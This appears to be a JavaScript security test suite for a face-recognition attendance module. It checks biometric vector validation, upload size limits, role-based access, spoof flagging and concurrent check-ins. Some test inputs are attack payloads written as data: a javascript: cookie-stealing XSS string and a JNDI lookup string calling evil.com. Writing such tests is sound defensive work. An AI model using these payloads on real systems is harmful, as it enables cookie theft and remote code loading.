/**
 * @file m12.face.security.test.js
 * @description Security, Hardening, and Doubt-Driven Stress Tests for Module M12: Face Recognition Attendance.
 *
 * SPECIFICATION & THREAT MODEL:
 * 1. Biometric vector protection: strictly 128-float finite numbers, 3-5 bounded descriptors, rejection of NaN/Infinity/strings.
 * 2. Spoofing/Replay defense & Flagged audit: failed verification flags attendance with captured snapshot.
 * 3. Payload DoS & XSS defense: snapshot and photo capped at 1.5MB, strict base64 image data URI format.
 * 4. PBAC boundary enforcement: strict horizontal & vertical authorization (only attendance.face.manage can approve/reject/reset).
 * 5. Impersonation defense: employee cannot enroll or punch on behalf of another user.
 * 6. Concurrency / Double-punch stress: multiple simultaneous check-ins maintain DB integrity without duplicates.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import mongoose from 'mongoose';
import jwt from 'jsonwebtoken';
import app from '../src/app.js';
import { env } from '../src/config/env.js';
import { User } from '../src/models/user.model.js';
import { Role } from '../src/models/role.model.js';
import { Employee } from '../src/models/employee.model.js';
import { Department } from '../src/models/department.model.js';
import { Designation } from '../src/models/designation.model.js';
import { Setting } from '../src/models/setting.model.js';
import { Attendance } from '../src/models/attendance.model.js';
import { AuditLog } from '../src/models/auditLog.model.js';
import { calculateEuclideanDistance } from '../src/modules/attendance/attendance.service.js';

describe('Module M12 Security & Hardening Suite (Doubt-Driven Stress Test)', () => {
  let superAdminToken, hrToken, managerToken, employeeToken, attackerToken;
  let superAdminUser, hrUser, managerUser, employeeUser, attackerUser;
  let employeeDoc, attackerDoc;
  let testDept, testDesig;

  const createMockVector = (baseVal = 0.1) => {
    return Array.from({ length: 128 }, (_, i) => baseVal + i * 0.001);
  };

  const validDescriptorA = createMockVector(0.10);
  const validDescriptorB = createMockVector(0.11);
  const validDescriptorC = createMockVector(0.12);
  const matchingDescriptor = createMockVector(0.102); // Distance < 0.50
  const spoofedDescriptor = createMockVector(0.95);   // Distance >> 0.50

  const createAuthToken = (user, roleName, roleId) => {
    return jwt.sign(
      {
        userId: user._id,
        email: user.email,
        role: roleName,
        roles: [roleName],
        roleId,
        employeeId: user.employeeId
      },
      env.JWT_ACCESS_SECRET,
      { expiresIn: '1h' }
    );
  };

  beforeAll(async () => {
    if (mongoose.connection.readyState === 0) {
      await mongoose.connect(env.MONGO_URI);
    }

    // 1. Roles
    const superAdminRole = await Role.findOneAndUpdate(
      { name: 'Super Admin' },
      {
        name: 'Super Admin',
        description: 'Super Admin Role',
        permissions: [{ action: 'manage', subject: 'all', scope: 'all' }]
      },
      { upsert: true, new: true }
    );

    const hrRole = await Role.findOneAndUpdate(
      { name: 'HR Manager' },
      {
        name: 'HR Manager',
        description: 'HR Role',
        permissions: [
          { action: 'attendance.face.manage', subject: 'Attendance', scope: 'all' },
          { action: 'attendance.mark', subject: 'Attendance', scope: 'own' },
          { action: 'attendance.view', subject: 'Attendance', scope: 'all' },
          { action: 'attendance.approve', subject: 'Attendance', scope: 'all' }
        ]
      },
      { upsert: true, new: true }
    );

    const managerRole = await Role.findOneAndUpdate(
      { name: 'Department Manager' },
      {
        name: 'Department Manager',
        description: 'Dept Manager Role',
        permissions: [
          { action: 'attendance.view', subject: 'Attendance', scope: 'team' },
          { action: 'attendance.approve', subject: 'Attendance', scope: 'team' },
          { action: 'attendance.mark', subject: 'Attendance', scope: 'own' }
        ]
      },
      { upsert: true, new: true }
    );

    const employeeRole = await Role.findOneAndUpdate(
      { name: 'Employee' },
      {
        name: 'Employee',
        description: 'Employee Role',
        permissions: [
          { action: 'attendance.mark', subject: 'Attendance', scope: 'own' },
          { action: 'attendance.view', subject: 'Attendance', scope: 'own' }
        ]
      },
      { upsert: true, new: true }
    );

    // 2. Department & Designation
    testDept = await Department.findOneAndUpdate(
      { name: 'Security Test Dept' },
      { name: 'Security Test Dept', code: 'STD' },
      { upsert: true, new: true }
    );

    testDesig = await Designation.findOneAndUpdate(
      { title: 'Security Engineer' },
      { title: 'Security Engineer', departmentId: testDept._id },
      { upsert: true, new: true }
    );

    // 3. Users
    employeeUser = await User.findOneAndUpdate(
      { email: 'm12.sec.alice@example.com' },
      {
        name: 'Alice Sec Employee',
        email: 'm12.sec.alice@example.com',
        passwordHash: 'dummyhash',
        roles: [employeeRole._id],
        faceEnrollment: { status: 'none', descriptors: [] }
      },
      { upsert: true, new: true }
    );

    employeeDoc = await Employee.findOneAndUpdate(
      { email: 'm12.sec.alice@example.com' },
      {
        employeeCode: 'SEC-EMP-01',
        name: 'Alice Sec Employee',
        email: 'm12.sec.alice@example.com',
        departmentId: testDept._id,
        designationId: testDesig._id,
        userId: employeeUser._id,
        status: 'Active'
      },
      { upsert: true, new: true }
    );
    employeeUser.employeeId = employeeDoc._id;
    await employeeUser.save();

    attackerUser = await User.findOneAndUpdate(
      { email: 'm12.sec.attacker@example.com' },
      {
        name: 'Mallory Attacker',
        email: 'm12.sec.attacker@example.com',
        passwordHash: 'dummyhash',
        roles: [employeeRole._id],
        faceEnrollment: { status: 'none', descriptors: [] }
      },
      { upsert: true, new: true }
    );

    attackerDoc = await Employee.findOneAndUpdate(
      { email: 'm12.sec.attacker@example.com' },
      {
        employeeCode: 'SEC-EMP-02',
        name: 'Mallory Attacker',
        email: 'm12.sec.attacker@example.com',
        departmentId: testDept._id,
        designationId: testDesig._id,
        userId: attackerUser._id,
        status: 'Active'
      },
      { upsert: true, new: true }
    );
    attackerUser.employeeId = attackerDoc._id;
    await attackerUser.save();

    managerUser = await User.findOneAndUpdate(
      { email: 'm12.sec.manager@example.com' },
      {
        name: 'Bob Sec Manager',
        email: 'm12.sec.manager@example.com',
        passwordHash: 'dummyhash',
        roles: [managerRole._id]
      },
      { upsert: true, new: true }
    );

    hrUser = await User.findOneAndUpdate(
      { email: 'm12.sec.hr@example.com' },
      {
        name: 'Helen Sec HR',
        email: 'm12.sec.hr@example.com',
        passwordHash: 'dummyhash',
        roles: [hrRole._id]
      },
      { upsert: true, new: true }
    );

    superAdminUser = await User.findOneAndUpdate(
      { email: 'm12.sec.admin@example.com' },
      {
        name: 'Sam Sec Admin',
        email: 'm12.sec.admin@example.com',
        passwordHash: 'dummyhash',
        roles: [superAdminRole._id]
      },
      { upsert: true, new: true }
    );

    // 4. Face Attendance Setting
    await Setting.findOneAndUpdate(
      { key: 'faceAttendance' },
      {
        key: 'faceAttendance',
        value: { isEnabled: true, matchThreshold: 0.50, requireLiveness: true }
      },
      { upsert: true, new: true }
    );

    // 5. Tokens
    superAdminToken = createAuthToken(superAdminUser, 'Super Admin', superAdminRole._id);
    hrToken = createAuthToken(hrUser, 'HR Manager', hrRole._id);
    managerToken = createAuthToken(managerUser, 'Department Manager', managerRole._id);
    employeeToken = createAuthToken(employeeUser, 'Employee', employeeRole._id);
    attackerToken = createAuthToken(attackerUser, 'Employee', employeeRole._id);
  });

  afterAll(async () => {
    await Attendance.deleteMany({
      employeeId: { $in: [employeeDoc?._id, attackerDoc?._id] }
    });
    await User.deleteMany({
      email: {
        $in: [
          'm12.sec.alice@example.com',
          'm12.sec.attacker@example.com',
          'm12.sec.manager@example.com',
          'm12.sec.hr@example.com',
          'm12.sec.admin@example.com'
        ]
      }
    });
    await Employee.deleteMany({
      email: { $in: ['m12.sec.alice@example.com', 'm12.sec.attacker@example.com'] }
    });
  });

  // =========================================================================
  // 1. Biometric Vector Protection & Poisoning Resistance
  // =========================================================================
  describe('Biometric Vector Validation & Poisoning Resistance', () => {
    it('should reject enrollment if descriptor coordinates contain NaN or Infinity', async () => {
      const poisonedVector = Array.from({ length: 128 }, () => 0.1);
      poisonedVector[5] = NaN;

      const res = await request(app)
        .post('/api/v1/attendance/face/enroll')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          descriptors: [poisonedVector, validDescriptorB, validDescriptorC]
        });

      expect([400, 413]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('should reject enrollment if descriptor coordinates contain strings or non-numbers', async () => {
      const poisonedVector = Array.from({ length: 128 }, () => 0.1);
      poisonedVector[10] = "MALICIOUS_INJECTION";

      const res = await request(app)
        .post('/api/v1/attendance/face/enroll')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          descriptors: [poisonedVector, validDescriptorB, validDescriptorC]
        });

      expect([400, 413]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('should reject enrollment if more than 5 descriptors are sent (memory DoS defense)', async () => {
      const extraDescriptors = [
        validDescriptorA,
        validDescriptorB,
        validDescriptorC,
        createMockVector(0.13),
        createMockVector(0.14),
        createMockVector(0.15) // 6 descriptors (max 5)
      ];

      const res = await request(app)
        .post('/api/v1/attendance/face/enroll')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          descriptors: extraDescriptors
        });

      expect([400, 413]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('should calculateEuclideanDistance safely without throwing if invalid data passed', () => {
      expect(calculateEuclideanDistance(null, null)).toBe(Infinity);
      expect(calculateEuclideanDistance([1, 2], [1])).toBe(Infinity);
      expect(calculateEuclideanDistance(['a', 'b'], [1, 2])).toBe(Infinity);
      expect(calculateEuclideanDistance([NaN, 1], [0, 1])).toBe(Infinity);
      expect(calculateEuclideanDistance([0, 0], [3, 4])).toBe(5);
    });
  });

  // =========================================================================
  // 2. Snapshot Payload Size Limit & Format Validation (DoS / XSS Defense)
  // =========================================================================
  describe('Payload Size & Data URI Hardening', () => {
    it('should reject enrollment photo exceeding 1.5MB limit', async () => {
      // Create a massive string > 1.5MB
      const hugePhoto = 'data:image/jpeg;base64,' + 'A'.repeat(1600000);

      const res = await request(app)
        .post('/api/v1/attendance/face/enroll')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          descriptors: [validDescriptorA, validDescriptorB, validDescriptorC],
          photo: hugePhoto
        });

      expect([400, 413]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('should reject invalid non-base64 photo URI (e.g. script injection / XSS attempt)', async () => {
      const res = await request(app)
        .post('/api/v1/attendance/face/enroll')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          descriptors: [validDescriptorA, validDescriptorB, validDescriptorC],
          photo: 'javascript:alert(document.cookie)'
        });

      expect([400, 413]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });
  });

  // =========================================================================
  // 3. PBAC Horizontal & Vertical Boundary Enforcement
  // =========================================================================
  describe('PBAC Boundary Enforcement', () => {
    it('should allow employee to submit valid enrollment for themselves', async () => {
      const res = await request(app)
        .post('/api/v1/attendance/face/enroll')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          descriptors: [validDescriptorA, validDescriptorB, validDescriptorC],
          photo: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD'
        });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.status).toBe('pending');
    });

    it('should block regular employee from approving their own enrollment (HTTP 403)', async () => {
      const res = await request(app)
        .patch(`/api/v1/attendance/face/${employeeUser._id}/approve`)
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(res.status).toBe(403);
    });

    it('should block regular employee from approving via aliased route (HTTP 403)', async () => {
      const res = await request(app)
        .post(`/api/v1/attendance/face/enrollments/${employeeUser._id}/approve`)
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(res.status).toBe(403);
    });

    it('should block Department Manager from approving face enrollment (HTTP 403)', async () => {
      const res = await request(app)
        .patch(`/api/v1/attendance/face/${employeeUser._id}/approve`)
        .set('Authorization', `Bearer ${managerToken}`);

      expect(res.status).toBe(403);
    });

    it('should block Department Manager from rejecting face enrollment (HTTP 403)', async () => {
      const res = await request(app)
        .patch(`/api/v1/attendance/face/${employeeUser._id}/reject`)
        .set('Authorization', `Bearer ${managerToken}`)
        .send({ reason: 'Unauthorized rejection attempt' });

      expect(res.status).toBe(403);
    });

    it('should block Department Manager from resetting face enrollment (HTTP 403)', async () => {
      const res = await request(app)
        .delete(`/api/v1/attendance/face/${employeeUser._id}`)
        .set('Authorization', `Bearer ${managerToken}`);

      expect(res.status).toBe(403);
    });

    it('should reject unauthenticated request with HTTP 401', async () => {
      const res = await request(app).get('/api/v1/attendance/face/status');
      expect(res.status).toBe(401);
    });

    it('should allow HR Manager to approve enrollment via aliased route POST /attendance/face/enrollments/:userId/approve', async () => {
      const res = await request(app)
        .post(`/api/v1/attendance/face/enrollments/${employeeUser._id}/approve`)
        .set('Authorization', `Bearer ${hrToken}`)
        .send({ reason: 'Approved by HR Manager' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);

      const dbUser = await User.findById(employeeUser._id);
      expect(dbUser.faceEnrollment.status).toBe('approved');
    });
  });

  // =========================================================================
  // 4. Anti-Spoofing & Replay Attack Defense with Flagged Audits
  // =========================================================================
  describe('Anti-Spoofing & Replay Attack Defense', () => {
    it('should reject face punch when liveDescriptor does not match enrolled template and flag record', async () => {
      const res = await request(app)
        .post('/api/v1/attendance/check-in')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          source: 'face',
          liveDescriptor: spoofedDescriptor,
          snapshot: 'data:image/jpeg;base64,spoofedsnapshot123'
        });

      expect([400, 413]).toContain(res.status);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toMatch(/Face verification failed/i);

      // Verify that flagged record was created
      const flaggedRecord = await Attendance.findOne({
        employeeId: employeeDoc._id,
        isFlagged: true
      });

      expect(flaggedRecord).toBeDefined();
      expect(flaggedRecord.isFlagged).toBe(true);
      expect(flaggedRecord.flagReason).toBe('face_match_failed');
      expect(flaggedRecord.snapshotUrl).toBe('data:image/jpeg;base64,spoofedsnapshot123');
      expect(flaggedRecord.confidenceDistance).toBeGreaterThan(0.50);
    });

    it('should audit face enrollment approvals in AuditLog collection', async () => {
      const log = await AuditLog.findOne({
        action: 'FACE_ENROLLMENT_APPROVED',
        targetId: employeeUser._id
      });

      expect(log).toBeDefined();
      expect(log.actorId.toString()).toBe(hrUser._id.toString());
    });
  });

  // =========================================================================
  // 5. NoSQL & ReDoS Stress Testing
  // =========================================================================
  describe('NoSQL / ReDoS Injection Resistance', () => {
    it('should handle special regex characters in search parameter without crashing', async () => {
      const maliciousPatterns = [
        '.*',
        '(.*)',
        '\\\\\\\\',
        'a{1,100000}',
        '[a-z]+',
        '??++++***',
        '${jndi:ldap://evil.com}'
      ];

      for (const pattern of maliciousPatterns) {
        const res = await request(app)
          .get(`/api/v1/attendance/face/enrollments?search=${encodeURIComponent(pattern)}`)
          .set('Authorization', `Bearer ${hrToken}`);

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        expect(Array.isArray(res.body.data)).toBe(true);
      }
    });

    it('should reject invalid objectId in face approval parameter with HTTP 400', async () => {
      const res = await request(app)
        .patch('/api/v1/attendance/face/not-a-valid-object-id/approve')
        .set('Authorization', `Bearer ${hrToken}`);

      expect([400, 413]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });
  });

  // =========================================================================
  // 6. Concurrency & Double-Punch Stress Test
  // =========================================================================
  describe('Concurrency & Double-Punch Stress Test', () => {
    it('should handle simultaneous face check-in requests safely without duplicate records', async () => {
      // Clean attendance records for Alice
      await Attendance.deleteMany({ employeeId: employeeDoc._id });

      // Fire 5 simultaneous face check-in requests
      const promises = Array.from({ length: 5 }, () =>
        request(app)
          .post('/api/v1/attendance/check-in')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            source: 'face',
            liveDescriptor: matchingDescriptor,
            snapshot: 'data:image/jpeg;base64,concurrencysnapshot'
          })
      );

      const results = await Promise.all(promises);

      // Count successes
      const successCount = results.filter((r) => r.status === 200).length;
      const errorCount = results.filter((r) => r.status === 400 || r.status === 409).length;

      // Exactly 1 check-in must succeed, the rest rejected as already clocked in (400) or DB unique violation (409)
      expect(successCount).toBe(1);
      expect(errorCount).toBe(4);

      // Verify DB has strictly 1 record for Alice
      const dbRecords = await Attendance.find({ employeeId: employeeDoc._id });
      expect(dbRecords.length).toBe(1);
      expect(dbRecords[0].source).toBe('face');
      expect(dbRecords[0].checkIn).toBeDefined();
    });
  });
});
